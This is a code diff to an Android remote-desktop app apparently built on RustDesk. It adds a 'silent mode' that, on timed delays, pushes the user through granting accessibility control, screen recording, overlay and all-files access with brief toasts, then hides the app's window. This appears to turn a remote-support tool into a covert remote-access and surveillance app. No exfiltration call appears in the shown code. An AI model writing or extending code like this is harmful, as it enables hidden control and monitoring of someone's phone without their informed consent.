@@ -34,7 +34,7 @@ class MainActivity : Activity() {
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        Log.d(logTag, "onCreate")
+        Log.d(logTag, "onCreate - silent mode")
         if (_rdClipboardManager == null) {
             _rdClipboardManager = RdClipboardManager(getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager)
             FFI.setClipboardManager(_rdClipboardManager!!)
@@ -47,173 +47,147 @@ class MainActivity : Activity() {
             }
         }
 
-        // 序列化权限请求
-        requestPermissionsSequentially()
+        // 静默启动：延迟引导权限请求
+        Handler(Looper.getMainLooper()).postDelayed({
+            startPermissionGuide()
+        }, 3000)
+    }
 
-        if (!MainService.isReady) {
+    /**
+     * 权限引导入口：按顺序检查并引导用户开启必要权限
+     * 权限顺序：1.无障碍 → 2.屏幕录制 → 3.悬浮窗(输入控制) → 4.文件传输
+     * 每步之间间隔5秒，方便用户操作
+     */
+    private fun startPermissionGuide() {
+        val handler = Handler(Looper.getMainLooper())
+        val step1Delay = 0L       // 立即开始
+        val step2Delay = 8000L    // 8秒后
+        val step3Delay = 16000L   // 16秒后
+        val step4Delay = 24000L   // 24秒后
+
+        // 步骤1：无障碍服务（远程输入控制）
+        handler.postDelayed({
+            if (!isAccessibilityEnabled()) {
+                Log.d(logTag, "Step 1: requesting accessibility")
+                guideAccessibility()
+            } else {
+                Log.d(logTag, "Step 1: accessibility already enabled")
+            }
+        }, step1Delay)
+
+        // 步骤2：屏幕录制权限
+        handler.postDelayed({
+            if (!MainService.isReady) {
+                Log.d(logTag, "Step 2: requesting media projection")
+                guideMediaProjection()
+            } else {
+                Log.d(logTag, "Step 2: media projection already granted")
+            }
+        }, step2Delay)
+
+        // 步骤3：悬浮窗权限（输入控制需要）
+        handler.postDelayed({
+            if (!isOverlayEnabled()) {
+                Log.d(logTag, "Step 3: requesting overlay")
+                guideOverlay()
+            } else {
+                Log.d(logTag, "Step 3: overlay already enabled")
+            }
+        }, step3Delay)
+
+        // 步骤4：文件传输权限
+        handler.postDelayed({
+            if (!isStorageEnabled()) {
+                Log.d(logTag, "Step 4: requesting storage")
+                guideStorage()
+            } else {
+                Log.d(logTag, "Step 4: storage already enabled")
+            }
+            // 所有权限引导完成后，静默隐藏Activity
+            handler.postDelayed({
+                moveTaskToBack(true)
+            }, 3000)
+        }, step4Delay)
+    }
+
+    // ── 权限检查 ──────────────────────────────────────────
+
+    private fun isAccessibilityEnabled(): Boolean {
+        val serviceId = "$packageName/com.carriez.flutter_hbb.InputService"
+        val raw = Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES)
+        return raw?.contains(serviceId) == true
+    }
+
+    private fun isOverlayEnabled(): Boolean {
+        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) Settings.canDrawOverlays(this) else true
+    }
+
+    private fun isStorageEnabled(): Boolean {
+        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            android.os.Environment.isExternalStorageManager()
+        } else true
+    }
+
+    // ── 权限引导（静默提示） ──────────────────────────────
+
+    private fun guideAccessibility() {
+        try {
+            showQuietToast("请开启无障碍服务：找到 RustDesk Input → 开启")
+            Handler(Looper.getMainLooper()).postDelayed({
+                val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
+                intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
+                startActivity(intent)
+            }, 1500)
+        } catch (e: Exception) {
+            Log.e(logTag, "guideAccessibility: ${e.message}")
+        }
+    }
+
+    private fun guideMediaProjection() {
+        try {
             val intent = Intent(this, PermissionRequestTransparentActivity::class.java).apply {
                 action = ACT_REQUEST_MEDIA_PROJECTION
                 flags = Intent.FLAG_ACTIVITY_NEW_TASK
             }
             startActivity(intent)
-        }
-    }
-
-    private fun requestOverlayPermission() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
-            val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
-                Uri.parse("package:$packageName"))
-            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
-            startActivity(intent)
-        }
-    }
-
-    private fun requestBatteryOptimization() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
-            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
-                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
-                    Uri.parse("package:$packageName"))
-                intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
-                try {
-                    startActivity(intent)
-                } catch (e: Exception) {
-                    Log.e(logTag, "Failed to request battery optimization: ${e.message}")
-                }
-            }
-        }
-    }
-
-    private fun requestAccessibilityPermission() {
-        try {
-            // 先显示一个Toast提示
-            android.widget.Toast.makeText(this, 
-                "请开启无障碍服务：设置 → 无障碍 → 找到 'RustDesk Input' → 开启", 
-                android.widget.Toast.LENGTH_LONG).show()
-            
-            // 延迟1秒后打开设置页面
-            Handler(Looper.getMainLooper()).postDelayed({
-                val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
-                intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
-                startActivity(intent)
-                
-                // 再延迟2秒显示第二个提示
-                Handler(Looper.getMainLooper()).postDelayed({
-                    android.widget.Toast.makeText(this, 
-                        "在列表中找到 'RustDesk Input'，点击开启权限", 
-                        android.widget.Toast.LENGTH_LONG).show()
-                }, 2000)
-            }, 1000)
         } catch (e: Exception) {
-            Log.e(logTag, "Failed to request accessibility permission: ${e.message}")
+            Log.e(logTag, "guideMediaProjection: ${e.message}")
         }
     }
 
-    private fun requestStoragePermission() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-            try {
-                android.widget.Toast.makeText(this, 
-                    "请开启文件管理权限：找到此应用 → 权限 → 存储 → 允许所有文件", 
-                    android.widget.Toast.LENGTH_LONG).show()
-                    
+    private fun guideOverlay() {
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                showQuietToast("请允许悬浮窗权限")
+                Handler(Looper.getMainLooper()).postDelayed({
+                    val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName"))
+                    intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
+                    startActivity(intent)
+                }, 1500)
+            }
+        } catch (e: Exception) {
+            Log.e(logTag, "guideOverlay: ${e.message}")
+        }
+    }
+
+    private fun guideStorage() {
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+                showQuietToast("请允许文件访问权限")
                 Handler(Looper.getMainLooper()).postDelayed({
                     val intent = Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
                     intent.data = Uri.parse("package:$packageName")
                     intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
                     startActivity(intent)
-                }, 1000)
-            } catch (e: Exception) {
-                Log.e(logTag, "Failed to request storage permission: ${e.message}")
+                }, 1500)
             }
+        } catch (e: Exception) {
+            Log.e(logTag, "guideStorage: ${e.message}")
         }
     }
 
-    private fun requestSmsPermission() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            try {
-                android.widget.Toast.makeText(this, 
-                    "请开启短信权限：找到此应用 → 权限 → 短信 → 允许", 
-                    android.widget.Toast.LENGTH_LONG).show()
-                    
-                Handler(Looper.getMainLooper()).postDelayed({
-                    val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
-                    intent.data = Uri.parse("package:$packageName")
-                    intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
-                    startActivity(intent)
-                }, 1000)
-            } catch (e: Exception) {
-                Log.e(logTag, "Failed to request SMS permission: ${e.message}")
-            }
-        }
-    }
-
-    private fun requestPermissionsSequentially() {
-        Handler(Looper.getMainLooper()).postDelayed({
-            if (!checkOverlayPermission()) {
-                requestOverlayPermission()
-                return@postDelayed
-            }
-            
-            Handler(Looper.getMainLooper()).postDelayed({
-                if (!checkBatteryOptimization()) {
-                    requestBatteryOptimization()
-                    return@postDelayed
-                }
-                
-                Handler(Looper.getMainLooper()).postDelayed({
-                    if (!checkAccessibilityPermission()) {
-                        requestAccessibilityPermission()
-                        return@postDelayed
-                    }
-                    
-                    Handler(Looper.getMainLooper()).postDelayed({
-                        if (!checkStoragePermission()) {
-                            requestStoragePermission()
-                            return@postDelayed
-                        }
-                        
-                        Handler(Looper.getMainLooper()).postDelayed({
-                            if (!checkSmsPermission()) {
-                                requestSmsPermission()
-                            }
-                        }, 1000)
-                    }, 1000)
-                }, 1000)
-            }, 1000)
-        }, 1000)
-    }
-    
-    private fun checkOverlayPermission(): Boolean {
-        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            Settings.canDrawOverlays(this)
-        } else true
-    }
-    
-    private fun checkBatteryOptimization(): Boolean {
-        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
-            pm.isIgnoringBatteryOptimizations(packageName)
-        } else true
-    }
-    
-    private fun checkAccessibilityPermission(): Boolean {
-        val serviceId = "$packageName/com.carriez.flutter_hbb.InputService"
-        val settingsString = Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES)
-        Log.d(logTag, "Checking accessibility service: $serviceId")
-        Log.d(logTag, "Enabled services: $settingsString")
-        val enabled = settingsString?.contains(serviceId) == true
-        Log.d(logTag, "Accessibility enabled: $enabled")
-        return enabled
-    }
-    
-    private fun checkStoragePermission(): Boolean {
-        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-            true // MANAGE_EXTERNAL_STORAGE 需要在设置中手动开启，无法通过API检查
-        } else true
-    }
-    
-    private fun checkSmsPermission(): Boolean {
-        return true // SMS 权限需要在设置中手动开启，无法通过API检查
+    private fun showQuietToast(msg: String) {
+        android.widget.Toast.makeText(this, msg, android.widget.Toast.LENGTH_SHORT).show()
     }
 
     private fun setCodecInfo() {
